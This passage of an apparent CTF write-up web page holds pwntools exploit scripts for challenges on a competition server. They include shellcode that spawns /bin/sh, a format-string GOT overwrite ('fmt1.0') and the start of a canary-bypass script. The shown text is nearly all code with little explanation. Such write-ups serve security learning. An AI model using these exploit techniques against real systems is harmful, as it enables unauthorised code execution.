data-num=\"3\"></td><td><pre><span class=\"token comment\"># from ctypes import *</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>r <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'pwn.node.game.sycsec.com'</span><span class=\"token punctuation\">,</span><span class=\"token number\">30069</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\"># r = gdb.debug('./chal')</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\"># r = process('./chal')</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>elf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./chal'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token comment\"># ld-linux-x86-64.so.2</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token comment\"># srand = libc.srand (libc.time (0)) #ËÆæÁΩÆÁßçÂ≠ê</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>se      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>sa      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>sl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>sla     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>sea     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>rc      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> numb<span class=\"token operator\">=</span><span class=\"token number\">4096</span>          <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>numb<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>rl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                    <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>ru      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delims             <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>uu32    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>u32<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>uu64    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>u64<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>lic \t<span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>uu64<span class=\"token punctuation\">(</span>ru<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>pack    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">,</span> addr          <span class=\"token punctuation\">:</span>p32<span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>padding <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> lenth              <span class=\"token punctuation\">:</span><span class=\"token string\">b'Yhuan'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>lenth<span class=\"token operator\">//</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">b'F'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>lenth <span class=\"token operator\">%</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>it      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                    <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>index_addr <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>rl<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">15</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x4</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>index_addr <span class=\"token operator\">=</span> <span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>index_addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>index_addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>shellcode <span class=\"token operator\">=</span> <span class=\"token string\">b'\\x48\\x31\\xf6\\x56\\x48\\xbf\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x57\\x54\\x5f\\x6a\\x3b\\x58\\x99\\x0f\\x05'</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>sl<span class=\"token punctuation\">(</span>shellcode<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>sla<span class=\"token punctuation\">(</span><span class=\"token string\">b'index:\\n'</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'40'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>sl<span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>index_addr<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>sla<span class=\"token punctuation\">(</span><span class=\"token string\">b'index:\\n'</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'41'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>sl<span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>index_addr<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>sla<span class=\"token punctuation\">(</span><span class=\"token string\">b'index:\\n'</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'42'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>sl<span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>index_addr<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>sla<span class=\"token punctuation\">(</span><span class=\"token string\">b'index:\\n'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'43'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>sl<span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>index_addr<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">8</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>sla<span class=\"token punctuation\">(</span><span class=\"token string\">b'index:\\n'</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'44'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>sl<span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>index_addr<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">10</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">8</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>sla<span class=\"token punctuation\">(</span><span class=\"token string\">b'index:\\n'</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'45'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>sl<span class=\"token punctuation\">(</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>index_addr<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">12</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>sla<span class=\"token punctuation\">(</span><span class=\"token string\">b'index:\\n'</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'-1'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>it<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"fmt10\"><a class=\"markdownIt-Anchor\" href=\"#fmt10\">#</a> fmt1.0</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span><span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\"># from ctypes import *</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>r <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'pwn.node.game.sycsec.com'</span><span class=\"token punctuation\">,</span><span class=\"token number\">31898</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\"># r = gdb.debug('./fmt1.0')</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\"># r = process('./fmt1.0')</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>elf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./fmt1.0'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token comment\"># ld-linux-x86-64.so.2</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token comment\"># srand = libc.srand (libc.time (0)) #ËÆæÁΩÆÁßçÂ≠ê</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>se      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>sa      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>sl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>sla     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>sea     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>rc      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> numb<span class=\"token operator\">=</span><span class=\"token number\">4096</span>          <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>numb<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>rl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                    <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>ru      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delims             <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>uu32    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>u32<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>uu64    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>u64<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>lic \t<span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>uu64<span class=\"token punctuation\">(</span>ru<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>pack    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">,</span> addr          <span class=\"token punctuation\">:</span>p32<span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>padding <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> lenth              <span class=\"token punctuation\">:</span><span class=\"token string\">b'Yhuan'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>lenth<span class=\"token operator\">//</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token string\">b'F'</span><span class=\"token operator\">*</span><span class=\"token punctuation\">(</span>lenth <span class=\"token operator\">%</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>it      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                    <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>ret_addr <span class=\"token operator\">=</span> <span class=\"token number\">0x401257</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>print_got <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'printf'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>execve <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span><span class=\"token string\">'execve'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>payload<span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>fmtstr_payload<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">&#123;</span><span class=\"token number\">0x404020</span><span class=\"token punctuation\">:</span><span class=\"token number\">0x4010D0</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">0x58</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>ret_addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>r<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>payload <span class=\"token operator\">=</span><span class=\"token string\">b'/bin/sh\\x00'</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>r<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>r<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"white_canary\"><a class=\"markdownIt-Anchor\" href=\"#white_canary\">#</a> white_canary</h3>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span><span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> ctypes <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>elf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./chal'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token comment\"># ld-linux-x86-64.so.2</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\"># srand = libc.srand (libc.time (0)) #ËÆæÁΩÆÁßçÂ≠ê</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>libc <span class=\"token operator\">=</span> cdll<span class=\"token punctuation\">.</span>LoadLibrary<span class=\"token punctuation\">(</span><span class=\"token string\">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class=\"token punctuation\">)</span> </pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>se      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>sa      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>sl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>sla     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>sea     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delim<span class=\"token punctuation\">,</span>data         <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span>delim<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>rc      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> numb<span class=\"token operator\">=</span><span class=\"token number\">4096</span>          <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>numb<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>rl      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>                    <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>recvline<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>ru      <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> delims             <span class=\"token punctuation\">:</span>r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span>delims<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>uu32    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>u32<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>uu64    <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>u64<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>lic     <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> data               <span class=\"token punctuation\">:</span>uu64<span class=\"token punctuation\">(</span>ru<span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td 